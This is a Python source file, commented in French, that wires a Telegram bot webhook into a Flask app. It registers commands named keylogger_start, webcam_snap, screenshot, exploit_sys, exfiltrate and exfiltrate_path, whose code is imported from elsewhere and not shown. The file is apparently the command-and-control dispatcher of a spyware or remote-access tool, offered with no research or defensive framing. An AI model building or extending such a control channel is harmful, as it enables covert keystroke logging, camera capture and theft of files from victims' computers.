import os
import traceback
from flask import Blueprint, request, Response
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler
)

# ✅ Import clés depuis utils
from modules.utils import get_api_keys

# ✅ Commandes
from telegram_bot.telegram_bot import (
    menu, osint, scan, exploit_sys,
    screenshot, keylogger_start,
    webcam_snap, exfiltrate, exfiltrate_path,
    rapport
)

# ✅ Récupération des clés API
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

# ✅ Création de l'application Telegram
application = ApplicationBuilder().token(TOKEN).build()

# ✅ Ajout des handlers une seule fois
application.add_handler(CommandHandler("menu", menu))
application.add_handler(CommandHandler("osint", osint))
application.add_handler(CommandHandler("scan", scan))
application.add_handler(CommandHandler("exploit_sys", exploit_sys))
application.add_handler(CommandHandler("screenshot", screenshot))
application.add_handler(CommandHandler("keylogger_start", keylogger_start))
application.add_handler(CommandHandler("webcam_snap", webcam_snap))
application.add_handler(CommandHandler("exfiltrate", exfiltrate))
application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
application.add_handler(CommandHandler("rapport", rapport))

# ✅ Blueprint Flask
telegram_webhook = Blueprint("telegram_webhook", __name__)

@telegram_webhook.route("/webhook", methods=["POST"])
async def handle_webhook():
    try:
        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
            return Response("Unauthorized", status=403)

        update = Update.de_json(request.get_json(force=True), application.bot)

        # ✅ Initialisation obligatoire (corrige RuntimeError)
        if not application.initialized:
            await application.initialize()

        # ✅ Traitement du message
        await application.process_update(update)

        print("✅ Webhook Telegram traité avec succès.")
        return Response("OK", status=200)

    except Exception as e:
        print("❌ Erreur webhook :", str(e))
        traceback.print_exc()
        return Response("Erreur serveur", status=500)
